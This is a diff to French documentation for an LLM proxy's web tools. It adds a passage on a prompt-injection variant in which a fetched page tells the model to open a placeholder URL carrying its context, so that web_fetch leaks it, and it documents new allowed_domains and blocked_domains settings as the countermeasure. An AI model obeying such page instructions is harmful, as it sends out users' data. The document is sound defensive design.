@@ -758,6 +758,12 @@ modèle : c'est l'injection de prompt. Le modèle qui les suit lance un
 `shell`, modifie un fichier, envoie ailleurs ce qu'il a lu, avec les
 droits que le client lui a donnés.
 
+Une variante ne passe pas par le poste du client : la page demande au
+modèle d'ouvrir `https://ailleurs/?d=<ce qu'il a en contexte>`, et
+`web_fetch` l'emporte. La seule parade côté proxy est de restreindre ce
+qu'il peut ouvrir : `allowed_domains` (liste blanche) ou
+`blocked_domains` dans `[tools.web_fetch]`. Vides par défaut.
+
 Les garde-fous ci-dessus protègent **le réseau du proxy** et bornent des
 tailles. Aucun ne lit, ne filtre ni ne neutralise ce qu'une page dit, et
 aucun ne le peut. Activer `web_search`, c'est faire lire du texte non
@@ -910,6 +916,8 @@ Les [outils hébergés](#outils-hébergés) : ce qui est commun aux deux.
 | `max_bytes` | `2000000` | Octets lus au plus sur le corps d'une page |
 | `max_chars` | `20000` | Caractères de texte rendus par appel ; la suite se demande par `offset` |
 | `allow_private` | `false` | `false` : seules les adresses **publiques** sont jointes, contrôle refait à chaque redirection. `true` lève le filtre — à n'ouvrir que sur un proxy dont tous les clients sont de confiance, et jamais derrière un modèle qui lit le web |
+| `allowed_domains` | `[]` | Non vide : **seuls** ces domaines sont lus par `web_fetch` (sous-domaines couverts, chemin facultatif : `example.com/blog`). Contrôlé à chaque redirection |
+| `blocked_domains` | `[]` | Domaines jamais lus, mêmes règles |
 
 ### `[quotas]` (backends à quotas)
 
